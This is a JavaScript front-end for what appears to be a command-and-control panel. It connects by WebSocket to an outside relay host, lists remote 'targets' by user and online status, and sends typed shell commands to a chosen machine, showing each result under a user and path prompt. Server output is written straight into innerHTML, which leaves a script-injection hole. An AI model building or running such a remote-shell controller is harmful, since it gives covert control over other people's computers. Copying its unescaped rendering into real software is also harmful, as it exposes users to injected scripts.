
const screens = [`
<div class="list" id="list">

</div>
<div class="tra"></div>
<div class="controles">
    <div class="data" id="data">
    </div>
    <input type="button" class="selict" value="to set" onclick="get_target()" id="selict"/>
</div>
`,`
<div class="output" id="output">

</div>
    <input type="text" class="text" id="value_text">
    <div class="buttons">
        <input type="button" id="button_send" value="Running" onclick="send_command()">
        <input type="button" value="Exit" onclick="exit()">
    </div>
    </div>`]
var data1 , data2 ,this_ws_id ,target_ws_id , inde , S = 0
var ping = []
const Soket = new WebSocket('wss://isoc1.onrender.com')
Soket.addEventListener('open',(event)=>{
    console.log('connected to Server')
    Soket.send('get_me_data')
})
Soket.addEventListener('message',({data})=>{
    try{
        let response = JSON.parse(data)
        if (response.res_coomand) {
            RENDER_TEXT(response)
        }else if (response.ping) {
            PING(response)
        }else if (response.this_ws_id) {
            THIS_WS_ID(response)
        }else if (response.targets){
            TARGETS(response)
        }
        console.log(response)
    }catch{
        console.log('!!! : '+data)
    }
})
Soket.addEventListener('error',(event)=>{
    console.log('Error! : ' + event)
})
Soket.addEventListener('close',(event)=>{
    console.log('Server disconnected!')
})
//--------------------------------------------------------------------------
function exit() {
    SCR(0);
    Soket.send('get_me_data')
}
function get_target(){
    SCR(1)
    target_ws_id = data1[inde]._id
    Soket.send(JSON.stringify({
        method:"send_to",
        send_to:target_ws_id,
        data:{
            res_to:this_ws_id,
            get:"data"
        }
    }))
}
function send_command() {
    Soket.send(JSON.stringify({
        method:"send_to",
        send_to:target_ws_id,
        data:{
            res_to:this_ws_id,
            get:"data",
            command:document.getElementById('value_text').value
        } 
    }))
    document.getElementById(`a${S}`).innerText = document.getElementById('value_text').value
    document.getElementById('value_text').value = ""
}
function RENDER_TEXT(response) {
    if (response.text) {
        console.log('ress')
        document.getElementById('output').innerHTML += `
        <div class="new_output_response">
            <span>
                ${response.text}
            </span>
        </div>
        `
    }
    if (response.path) {
        S ++
        document.getElementById('output').innerHTML += `
        <div class="new_output">
            <br>
            <hr>
            <h1>|--<h3>(</h3><h1>${response.user}</h1><h3>)</h3><h1>-</h1><h4>[</h4><p>${response.path}</p><h4>]</h4><br><h1>|--</h1><h2>$ </h2></h1><p style="color: blue;" id="a${S}"></p>
        </div>
        `
    }
}
function TARGETS(response) {
    let targets = response.targets.reverse() //.reverse()
    data1 = targets
        list.innerHTML = ''
        for (let z = 0; z < targets.length; z++) {
        let list = document.getElementById('list')
        list.innerHTML += ` 
            <div class="item" onclick="CLICK(this.id)" id="${z}">
                <img src="GET_DATA/home/img/linux.png/n/n/n" alt="">
                <h1>${targets[z].user}</h1>
                <div class="led${targets[z].online}"></dev>
            </div>
            `
    }
}
function THIS_WS_ID(response) {
    this_ws_id = response.this_ws_id
    console.log('this_ws_id >>>' + this_ws_id)
}
function PING(response) {
    if (response.ping == "ok") {
        ping[1] = Date.now()
        document.getElementById('ping').innerText = ping[1] - ping[0]
    }
}
function CLICK(index){
    inde = index
    let dtt = document.getElementById('data')
    dtt.innerHTML = ''
    console.log(data1[index])
    if (data1[index].online == true) {
        let D = {
            method:"send_to",
            send_to:data1[index]._id,
            data:{
                res_to:this_ws_id
            }

        }
        ping[0] = Date.now()
        Soket.send(JSON.stringify(D))
        document.getElementById('selict').style.display = 'block'
        dtt.innerHTML += `        
        <h1><p>${data1[index].user}</p></h1>
        <hr>
        <h1><span>on line</span></h1>    
        <hr>
        <h1>ping : <p id="ping" >..</p></h1>   
        <hr>
         <h1>ID : <p>${data1[index]._id}</p></h1>
        `
    }else{
        document.getElementById('selict').style.display = 'none'
        dtt.innerHTML += `        
        <h1><p>${data1[index].user}</p></h1>
        <hr>
        <h1><p>off line</p></h1>
        `
    }
    
}
const SCR = (s)=>{
    if (s == 0) {
        document.body.innerHTML = screens[0]
        document.head.innerHTML = `
        <meta charset="UTF-8">
        <title>HOME</title>
        <link rel="stylesheet" href="/GET_DATA/home/style/style_1_1.css/n/n/n">
        `
    }else if (s == 1){
        document.body.innerHTML = screens[1]
        document.head.innerHTML = `
        <meta charset="UTF-8">
        <title></title>
        <link rel="stylesheet" href="/GET_DATA/home/style/style_2_1.css/n/n/n">
        `
    }
}
SCR(0)
